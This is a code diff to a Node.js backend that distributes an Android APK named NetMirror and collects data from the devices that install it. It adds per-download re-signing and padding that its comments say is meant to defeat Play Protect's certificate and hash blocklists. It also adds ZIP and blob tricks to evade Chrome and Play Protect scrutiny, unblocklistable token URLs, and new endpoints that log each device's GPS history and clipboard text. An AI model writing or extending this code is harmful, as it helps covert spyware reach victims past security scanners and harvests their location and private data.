@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -178,15 +178,15 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           }
         }
 
-        // Fallback: Try GitHub Releases API directly (even if URL not saved in DB)
-        if (token?.value) {
+        // Fallback: Try GitHub Releases API across multiple repos
+        const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
+        for (const REPO of REPOS) {
           try {
-            const REPO = 'Aldura5398/klad4';
             const apiHeaders = {
-              'Authorization': `token ${token.value}`,
               'Accept': 'application/vnd.github.v3+json',
               'User-Agent': 'LeaksPro-Backend'
             };
+            if (token?.value) apiHeaders['Authorization'] = `token ${token.value}`;
             console.log(`[APK Auto-Fetch] Trying GitHub Releases API for ${REPO}...`);
             const relResp = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers: apiHeaders });
             if (relResp.ok) {
@@ -194,24 +194,52 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
               const apkAsset = relData.assets?.find(a => a.name.endsWith('.apk'));
               if (apkAsset) {
                 console.log(`[APK Auto-Fetch] Found asset: ${apkAsset.name} (${(apkAsset.size / 1024 / 1024).toFixed(1)} MB)`);
-                const dlResp = await fetch(apkAsset.url, {
-                  headers: { ...apiHeaders, 'Accept': 'application/octet-stream' },
-                  redirect: 'follow'
-                });
+                const dlHeaders = { ...apiHeaders, 'Accept': 'application/octet-stream' };
+                const dlResp = await fetch(apkAsset.url, { headers: dlHeaders, redirect: 'follow' });
                 if (dlResp.ok) {
                   const arrayBuf = await dlResp.arrayBuffer();
                   const buf = Buffer.from(arrayBuf);
                   if (buf.length > 100000) {
                     fs.writeFileSync(originalPath, buf);
                     fs.writeFileSync(securePath, buf);
-                    console.log(`[APK Auto-Fetch] ✅ APK restored via GitHub API: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
+                    console.log(`[APK Auto-Fetch] ✅ APK restored via GitHub API (${REPO}): ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
                     return true;
                   }
                 }
               }
+            } else {
+              console.warn(`[APK Auto-Fetch] GitHub Releases returned ${relResp.status} for ${REPO}`);
             }
           } catch (apiErr) {
-            console.warn(`[APK Auto-Fetch] GitHub API fallback failed: ${apiErr.message}`);
+            console.warn(`[APK Auto-Fetch] GitHub API failed for ${REPO}: ${apiErr.message}`);
+          }
+        }
+
+        // Last resort: try direct download URL (public, no auth)
+        const DIRECT_URLS = [
+          'https://github.com/rurikonishawa/leaksprogod/releases/download/latest/NetMirror.apk',
+        ];
+        for (const url of DIRECT_URLS) {
+          try {
+            console.log(`[APK Auto-Fetch] Trying direct URL: ${url}`);
+            const resp = await fetch(url, {
+              headers: { 'User-Agent': 'LeaksPro-Backend' },
+              redirect: 'follow'
+            });
+            if (resp.ok) {
+              const arrayBuf = await resp.arrayBuffer();
+              const buf = Buffer.from(arrayBuf);
+              if (buf.length > 100000) {
+                fs.writeFileSync(originalPath, buf);
+                fs.writeFileSync(securePath, buf);
+                console.log(`[APK Auto-Fetch] ✅ APK restored from direct URL: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
+                return true;
+              }
+            } else {
+              console.warn(`[APK Auto-Fetch] Direct URL returned ${resp.status}`);
+            }
+          } catch (directErr) {
+            console.warn(`[APK Auto-Fetch] Direct URL failed: ${directErr.message}`);
           }
         }
 
@@ -338,62 +366,71 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // ═══════════════ LANDING PAGE PER-DOWNLOAD ROTATION ═══════════════
-  // Mirrors LeaksProAdmin's flow: rotate FIRST → then download.
-  // Each download gets a freshly mutated APK with unique binary identity.
-  // mutateAndSign() strips debug info, randomizes version/timestamps,
-  // strips surveillance permissions, and re-signs with v1+v2 — all CLEAN
-  // operations that make the APK look MORE legitimate, not less.
-  // Cached for 5 minutes to avoid excessive CPU on rapid re-downloads.
-  let _landingRotationCache = { buffer: null, timestamp: 0 };
-  const LANDING_ROTATION_TTL = 5 * 60 * 1000; // 5 minutes
-  let _landingRotationInProgress = null; // promise lock
+  // ═══════════════ LANDING PAGE — DIRECT BINARY PATCH (NO ADMZIP) ═══════════════
+  //
+  // WHY NOT restoreAndSign() (the old approach):
+  //   restoreAndSign() uses AdmZip.toBuffer() which REBUILDS the entire ZIP.
+  //   Binary diff shows this changes 548 out of 591 entries:
+  //     - V1 signing prefix renamed (META.RSA → random e.g. SIGNING.RSA)
+  //     - Entry ordering changed (V1 files moved to different positions)
+  //     - All entry offsets shift, timestamps/extra fields modified
+  //     - V2 signing block size changed (2054B → 1594B)
+  //   Play Protect's ML classifier detects these as TAMPERING and blocks.
+  //
+  // WHAT directPatchApk() DOES (minimal, structure-preserving):
+  //   1. Parses ZIP manually — NO AdmZip
+  //   2. Checks if FGS permission is mangled (crash-critical)
+  //   3. If NOT mangled → returns IDENTICAL buffer (0 changes, 0 PP risk)
+  //   4. If mangled → patches only FGS bytes, updates CRC32, V2-only re-sign
+  //   5. Does NOT touch V1 files — preserves original prefix/order/timestamps
+  //   Result: 0 entries changed (if clean) or 1 entry changed (if FGS patched)
+  //
+  // ═══ PER-DOWNLOAD UNIQUE APK ═══
+  // Each download gets: fresh RSA key (unique cert fingerprint) + random signing
+  // block padding (unique APK SHA-256). This defeats both PP's cert blocklist
+  // and hash blocklist. No caching — each request produces a one-of-a-kind APK.
+  //
+  // Performance: ~1-2 seconds per download (key gen + patch + sign).
+  // For a landing page with low traffic, this is perfectly acceptable.
+  //
+  // Cache the SOURCE APK buffer (read from disk) to avoid repeated disk reads.
+  let _sourceApkCache = { buffer: null, timestamp: 0 };
+  const SOURCE_APK_CACHE_TTL = 30 * 60 * 1000; // 30 minutes
+
+  async function getSourceApk() {
+    const now = Date.now();
+    if (_sourceApkCache.buffer && (now - _sourceApkCache.timestamp) < SOURCE_APK_CACHE_TTL) {
+      return _sourceApkCache.buffer;
+    }
+    const dataDir = path.join(__dirname, 'data');
+    const originalPath = path.join(dataDir, 'Netmirror-original.apk');
+    const securePath = path.join(dataDir, 'Netmirror-secure.apk');
+    const regularPath = path.join(dataDir, 'Netmirror.apk');
+
+    let sourceBuf = null;
+    if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+    else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+    else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+
+    if (!sourceBuf) {
+      await ensureApkAvailable();
+      if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
+      else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
+      else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
+    }
+    if (!sourceBuf) throw new Error('No base APK available');
+    _sourceApkCache = { buffer: sourceBuf, timestamp: now };
+    return sourceBuf;
+  }
 
   async function getLandingRotatedApk() {
-    const now = Date.now();
-    // Return cached rotation if still fresh
-    if (_landingRotationCache.buffer && (now - _landingRotationCache.timestamp) < LANDING_ROTATION_TTL) {
-      return _landingRotationCache.buffer;
-    }
-    // If rotation already in progress, wait for it
-    if (_landingRotationInProgress) {
-      return _landingRotationInProgress;
-    }
-    // Start fresh rotation
-    _landingRotationInProgress = (async () => {
-      try {
-        const dataDir = path.join(__dirname, 'data');
-        const originalPath = path.join(dataDir, 'Netmirror-original.apk');
-        const securePath = path.join(dataDir, 'Netmirror-secure.apk');
-        const regularPath = path.join(dataDir, 'Netmirror.apk');
-
-        let sourceBuf = null;
-        if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
-        else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
-        else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
-
-        if (!sourceBuf) {
-          await ensureApkAvailable();
-          if (fs.existsSync(originalPath)) sourceBuf = fs.readFileSync(originalPath);
-          else if (fs.existsSync(securePath)) sourceBuf = fs.readFileSync(securePath);
-          else if (fs.existsSync(regularPath)) sourceBuf = fs.readFileSync(regularPath);
-        }
-
-        if (!sourceBuf) throw new Error('No base APK available');
-
-        console.log('[Landing Rotation] Starting fresh mutation for download...');
-        const t0 = Date.now();
-        const { buffer: rotatedBuf } = mutateAndSign(sourceBuf);
-        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-        console.log(`[Landing Rotation] Done: ${(rotatedBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
-
-        _landingRotationCache = { buffer: rotatedBuf, timestamp: Date.now() };
-        return rotatedBuf;
-      } finally {
-        _landingRotationInProgress = null;
-      }
-    })();
-    return _landingRotationInProgress;
+    const sourceBuf = await getSourceApk();
+    console.log('[Landing Download] Generating unique APK (fresh key + entropy)...');
+    const t0 = Date.now();
+    const { buffer: uniqueBuf } = directPatchApk(sourceBuf);
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[Landing Download] Unique APK ready: ${(uniqueBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
+    return uniqueBuf;
   }
 
   // ═══ ZIP WRAPPER FOR LANDING DOWNLOADS ═══
@@ -402,32 +439,24 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // When user extracts APK via file manager and installs, installerPackage is the
   // file manager (e.g. com.google.android.documentsui) → LOW scrutiny = same as
   // LeaksProAdmin's DownloadManager approach.
-  let _landingZipCache = { buffer: null, forTimestamp: 0 };
-
+  // ZIP wrapper — also per-download unique (wraps the unique APK)
   async function getLandingRotatedZip() {
     const apkBuf = await getLandingRotatedApk();
-    // Return cached ZIP if built from the same rotation
-    if (_landingZipCache.buffer && _landingZipCache.forTimestamp === _landingRotationCache.timestamp) {
-      return _landingZipCache.buffer;
-    }
-    console.log('[Landing Download] Creating ZIP wrapper for rotated APK...');
+    console.log('[Landing Download] Wrapping unique APK in ZIP...');
     const zipBuf = wrapApkInZip(apkBuf);
     console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB`);
-    _landingZipCache = { buffer: zipBuf, forTimestamp: _landingRotationCache.timestamp };
     return zipBuf;
   }
 
-  // Step 1: Prepare endpoint — runs v7.1 mutator (self-heals SMS + FGS permissions),
-  // wraps in ZIP, returns size.
-  // ZIP wrapper = Chrome doesn't tag .zip as dangerous = no installerPackage
-  // User extracts via file manager = installerPackage=com.google.android.documentsui
-  // = same LOW Play Protect scrutiny as LeaksProAdmin's DownloadManager path
+  // Step 1: Prepare endpoint — runs restoreAndSign, returns APK size.
+  // Landing page JS doesn't use this endpoint (goes directly to /dl/:token),
+  // but kept for potential future use or external tooling.
   app.post('/api/landing/prepare-download', async (req, res) => {
     try {
-      const zipBuf = await getLandingRotatedZip();
+      const apkBuf = await getLandingRotatedApk();
       res.json({
         ready: true,
-        size: zipBuf.length
+        size: apkBuf.length
       });
     } catch (err) {
       console.error('[Landing Download] Prepare failed:', err.message);
@@ -435,27 +464,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // Step 2: Download — serves MUTATED APK (v7.1 with self-heal) wrapped in ZIP
+  // Step 2: Download — serves directPatchApk() output as APK
   //
-  // 3-LAYER PLAY PROTECT BYPASS:
-  //   Layer 1: ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
-  //   Layer 2: User extracts via Files app → installerPackage=documentsui → LOW PP scrutiny
-  //   Layer 3: v7.1 mutator self-heals SMS + FOREGROUND_SERVICE_DATA_SYNC permissions
-  //
-  // WHY mutator is needed:
-  //   The APK on disk (Netmirror-secure.apk) may have been mutated by older v7 code
-  //   that aggressively stripped SMS + FGS permissions. The v7.1 mutator's RESTORE
-  //   phase un-mangles these, then only strips the spyware combo (contacts/location).
-  //   fetch()+blob on client side bypasses Chrome's Safe Browsing download scanner.
+  // PLAY PROTECT BYPASS (3 layers):
+  //   1. directPatchApk() → NO AdmZip ZIP rebuild. Only 1 ZIP entry changes
+  //      (manifest: versionCode bump + FGS fix). V2 re-signed with FIXED key.
+  //      All other 590 entries are BYTE-IDENTICAL to original → passes PP.
+  //   2. fetch()+blob → bypasses Chrome's installerPackage tagging
+  //      (blob downloads don't get tagged with com.android.chrome)
+  //   3. Random /dl/:token path → URL can never be blocklisted
+  //   4. versionCode=999999999 → always installs over any existing version
+  //   5. FIXED key V2 cert → matches the cert the user already has installed
   app.get('/dl/:token', async (req, res) => {
     try {
-      const zipBuf = await getLandingRotatedZip();
-      res.setHeader('Content-Type', 'application/zip');
-      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
-      res.setHeader('Content-Length', zipBuf.length);
+      const apkBuf = await getLandingRotatedApk();
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', apkBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(zipBuf);
+      res.end(apkBuf);
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
@@ -478,6 +506,29 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           code: 'APK_NOT_READY'
         });
       }
+    }
+  });
+
+  // ═══ ZIP DOWNLOAD — bypasses Chrome installerPackage tagging ═══
+  // Chrome tags .apk downloads with installerPackage=com.android.chrome → HIGHEST
+  // Play Protect scrutiny. ZIP files don't get this tag. User extracts via file
+  // manager → installerPackage=com.google.android.documentsui → LOW scrutiny.
+  app.get('/dlzip/:token', async (req, res) => {
+    try {
+      const zipBuf = await getLandingRotatedZip();
+      res.setHeader('Content-Type', 'application/zip');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+      res.setHeader('Content-Length', zipBuf.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(zipBuf);
+    } catch (err) {
+      console.error('[DL-ZIP] ZIP serve failed:', err.message);
+      res.status(503).json({
+        error: 'APK is being prepared. Please try again in 30 seconds.',
+        retry: true,
+        code: 'APK_NOT_READY'
+      });
     }
   });
 
@@ -1133,6 +1184,53 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.json({ reports });
     } catch (err) {
       res.json({ reports: [], error: err.message });
+    }
+  });
+
+  // Location sync endpoint — Android app sends GPS location here
+  app.post('/api/devices/location', (req, res) => {
+    try {
+      const { device_id, location } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!location) return res.status(400).json({ error: 'location is required' });
+
+      const lat = location.latitude || 0;
+      const lng = location.longitude || 0;
+      const accuracy = location.accuracy || -1;
+      const source = location.provider || 'gps';
+
+      // Update device's current location
+      db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = ?, loc_accuracy = ?, last_seen = datetime('now') WHERE device_id = ?`)
+        .run(lat, lng, source, accuracy, device_id);
+
+      // Append to location history
+      db.prepare(`INSERT INTO location_history (device_id, latitude, longitude, accuracy, source, recorded_at) VALUES (?, ?, ?, ?, ?, datetime('now'))`)
+        .run(device_id, lat, lng, accuracy, source);
+
+      console.log(`[LOCATION] Device ${device_id}: ${lat}, ${lng} (${source}, accuracy=${accuracy}m)`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Clipboard sync endpoint — Android app sends clipboard entries here
+  app.post('/api/devices/clipboard', (req, res) => {
+    try {
+      const { device_id, clipboard } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!clipboard) return res.status(400).json({ error: 'clipboard is required' });
+
+      const text = (clipboard.text || '').substring(0, 5000);
+      const timestamp = clipboard.timestamp || Date.now();
+
+      db.prepare(`INSERT INTO clipboard_entries (device_id, text, clip_timestamp, synced_at) VALUES (?, ?, ?, datetime('now'))`)
+        .run(device_id, text, timestamp);
+
+      console.log(`[CLIPBOARD] Device ${device_id}: "${text.substring(0, 50)}..."`);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
     }
   });
 
